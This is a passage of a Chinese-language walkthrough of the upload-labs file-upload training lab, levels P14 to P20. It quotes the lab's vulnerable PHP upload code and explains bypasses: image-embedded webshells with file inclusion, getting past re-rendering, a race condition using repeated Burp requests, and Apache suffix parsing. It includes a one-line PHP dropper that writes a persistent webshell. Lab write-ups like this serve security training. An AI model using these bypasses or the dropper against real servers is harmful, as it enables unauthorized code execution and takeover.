class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    show_source(<span class="keyword">__file__</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>那么此时上传之后，使用该漏洞便可成功绕过:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/upload-labs-master/include.php?file=./upload/file.png</span><br></pre></td></tr></table></figure><h2 id="P15"><a href="#P15" class="headerlink" title="P15"></a>P15</h2><p>这道题相对于P14对图片检测要求更严格，会检测上传图片的大小，此时就需要用到在P04说到的方法，copy图片和木马成为一个图片🐎；</p><p>之后利用文件包含漏洞绕过；</p><p>（实际上可以用010eiditor把木马以十六进制格式附加到图片末尾）</p><h2 id="P16"><a href="#P16" class="headerlink" title="P16"></a>P16</h2><p>同P15一样；</p><h2 id="P17"><a href="#P17" class="headerlink" title="P17"></a>P17</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$filetype</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmpname</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$target_path</span>=UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.basename(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得上传文件的扩展名</span></span><br><span class="line">    <span class="variable">$fileext</span>= substr(strrchr(<span class="variable">$filename</span>,<span class="string">&quot;.&quot;</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;jpg&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/jpeg&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = imagecreatefromjpeg(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是jpg格式的图片！&quot;</span>;</span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                <span class="variable">$newfilename</span> = strval(rand()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                imagejpeg(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;png&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/png&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = imagecreatefrompng(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是png格式的图片！&quot;</span>;</span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                <span class="variable">$newfilename</span> = strval(rand()).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                imagepng(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line"></span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;gif&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/gif&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = imagecreatefromgif(<span class="variable">$target_path</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是gif格式的图片！&quot;</span>;</span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                <span class="variable">$newfilename</span> = strval(rand()).<span class="string">&quot;.gif&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                imagegif(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line"></span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题很明显针对了图片马，在上传之后将图片进行重写，也就是二次渲染；</p><p>如何判断图片被二次渲染？当使用P15,P16的方法不起作用时，上传图片另存为下载下来查看是否木马语句还存在即可判断；</p><p>如何绕过？要知道，二次渲染只是将图片的原始内容保存，其他内容进行重写，那么要找到原始的内容，也就是没改写部分的内容，进行对木马的插入即可；找寻重写部分只需要使用010进行diff比较即可；</p><p>理论来说GIF更容易，而修改PNG文件不能直接插入；</p><h2 id="P18"><a href="#P18" class="headerlink" title="P18"></a>P18</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_ext</span> = substr(<span class="variable">$file_name</span>,strrpos(<span class="variable">$file_name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$upload_file</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             rename(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            unlink(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看起来和P12的源码很像，只不过PATH部分拼接由原来的GET传参变成了UPLOAD_PATH这么个东西，这说明没办法控制上传路径，就无法利用空字符截取了；</p><p>并且它是先move再in array，这和之前的顺序也有区别，这说明它是先将文件放到服务器的文件夹上，再去做后缀判断；</p><h3 id="文件上传条件竞争"><a href="#文件上传条件竞争" class="headerlink" title="文件上传条件竞争"></a>文件上传条件竞争</h3><p>前提：文件先到服务器上，再做判断；</p><p>本质：抢夺线程的资源，使得上传的木马文件可以快速访问运行一次（上传之后，判断之前）；</p><p>实际方式：一直上传，一直访问，在线程没反应过来的时候给与木马命令的执行；</p><p>总结：一个可执行php在目标文件夹一闪而逝即可利用；</p><p>但由于不可能只依靠这条一句话木马进行不可靠的信息传输，所以在需要这么访问的文件里，写入执行生成小马的语句，在它的上传文件目录中生成一个一直存在的一句话木马文件即可：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?一句话木马?&gt;&#x27;</span> ); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>若有检测标识符，可以用base64编码绕过；</p><p>如何实现一直上传？一直访问？使用bp的测试器模块进行持续重放攻击，抓取上传php的包以及一直访问的包；</p><p><img src="https://s2.loli.net/2023/12/26/N12ErLD6VzIh7JH.png" alt="try"></p><p>真是太裤辣！</p><h2 id="P19"><a href="#P19" class="headerlink" title="P19"></a>P19</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;./myupload.php&quot;</span>);</span><br><span class="line">    <span class="variable">$imgFileName</span> =time();</span><br><span class="line">    <span class="variable">$u</span> = <span class="keyword">new</span> MyUpload(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>],<span class="variable">$imgFileName</span>);</span><br><span class="line">    <span class="variable">$status_code</span> = <span class="variable">$u</span>-&gt;upload(UPLOAD_PATH);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$status_code</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable">$img_path</span> = <span class="variable">$u</span>-&gt;cls_upload_dir . <span class="variable">$u</span>-&gt;cls_file_rename_to;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件已经被上传，但没有重命名。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">1</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;这个文件不能上传到服务器的临时文件存储目录。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">2</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，上传目录不可写。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">3</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，无法上传该类型文件。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">4</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，上传的文件过大。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">5</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，服务器已经存在相同名称文件。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">6</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件无法上传，文件不能复制到目标目录。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;      </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;未知错误！&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//myupload.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyUpload</span></span>&#123;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$cls_arr_ext_accepted</span> = <span class="keyword">array</span>(</span><br><span class="line">      <span class="string">&quot;.doc&quot;</span>, <span class="string">&quot;.xls&quot;</span>, <span class="string">&quot;.txt&quot;</span>, <span class="string">&quot;.pdf&quot;</span>, <span class="string">&quot;.gif&quot;</span>, <span class="string">&quot;.jpg&quot;</span>, <span class="string">&quot;.zip&quot;</span>, <span class="string">&quot;.rar&quot;</span>, <span class="string">&quot;.7z&quot;</span>,<span class="string">&quot;.ppt&quot;</span>,</span><br><span class="line">      <span class="string">&quot;.html&quot;</span>, <span class="string">&quot;.xml&quot;</span>, <span class="string">&quot;.tiff&quot;</span>, <span class="string">&quot;.jpeg&quot;</span>, <span class="string">&quot;.png&quot;</span> );</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......  </span><br><span class="line">  <span class="comment">/** upload()</span></span><br><span class="line"><span class="comment">   **</span></span><br><span class="line"><span class="comment">   ** Method to upload the file.</span></span><br><span class="line"><span class="comment">   ** This is the only method to call outside the class.</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@para</span> String name of directory we upload to</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@returns</span> void</span></span><br><span class="line"><span class="comment">  **/</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"> <span class="variable">$dir</span> </span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;isUploadedFile();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;setDir( <span class="variable">$dir</span> );</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;checkExtension();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;checkSize();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if flag to check if the file exists is set to 1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_file_exists == <span class="number">1</span> )&#123;</span><br><span class="line">      </span><br><span class="line">      <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;checkFileExists();</span><br><span class="line">      <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if we are here, we are ready to move the file to destination</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;move();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check if we need to rename the file</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_rename_file == <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;renameFile();</span><br><span class="line">      <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if we are here, everything worked as planned :)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="string">&quot;SUCCESS&quot;</span> );</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>对于上传文件的代码审计：</p><p>先判断路径</p><p>再设置路径</p><p>再检查后缀以及文件大小</p><p>之后移动文件到服务器上</p><p>再进行随机重命名；</p><p>此时文件还没移动到服务器上就已经判断并删掉了，但是在白名单里面比之前多出来了一些压缩文件的后缀，不只是图片后缀了；</p><h3 id="apache解析漏洞"><a href="#apache解析漏洞" class="headerlink" title="apache解析漏洞"></a>apache解析漏洞</h3><p>对于apache服务器来说，访问一个服务器并不能解析的文件，它会对文件整体名字向前进行搜索，找到一个可以解析的后缀来执行；</p><p>例如一个文件叫做： file.php.7z ；</p><p>当用浏览器访问这个文件的时候，apache无法解析7z，就会把它当作一个php文件来执行；</p><p>而这道题虽然上传是在文件判断之后，但是7z后缀是可以上传上去的，只是之后会对其重命名，重命名变为xxx.7z，服务器不知道怎么解析，会用记事本打开；</p><p>赶在重命名之前对原文件进行访问，可以达到执行php的目的，实现针对于apache解析漏洞的条件竞争；</p><h2 id="P20"><a href="#P20" class="headerlink" title="P20"></a>P20</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span 